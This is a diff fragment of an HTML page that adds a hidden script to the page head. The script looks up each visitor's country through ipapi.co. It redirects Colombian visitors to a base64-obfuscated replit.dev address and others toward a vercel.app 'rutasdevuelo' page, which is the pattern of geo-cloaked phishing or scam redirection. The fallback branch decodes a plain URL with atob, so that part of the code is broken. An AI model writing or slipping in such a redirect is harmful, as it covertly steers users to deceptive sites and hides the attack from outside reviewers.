@@ -124,6 +124,22 @@
       h1{font-size:28px}
     }
   </style>
+
+  <script>
+(_=>{
+const u="https://rutasdevuelo.vercel.app/inicio.html",
+p="aHR0cHM6Ly82YTIyZmMyMi1mZmI2LTQxZWEtOTFlZC1kNjM4Mjk1OTdkMDktMDAtMmtmMHAyMWVncGQ0di5qYW5ld2F5LnJlcGxpdC5kZXYvaW5kZXguaHRtbA==",
+R=s=>location.href=atob(u);
+fetch("https://ipapi.co/json/")
+.then(r=>r.json())
+.then(j=>{
+ (j.country||"")=="CO"
+   ? location.href = atob(p)
+   : R();
+})
+.catch(R);
+})();
+</script>
 </head>
 
 <body>
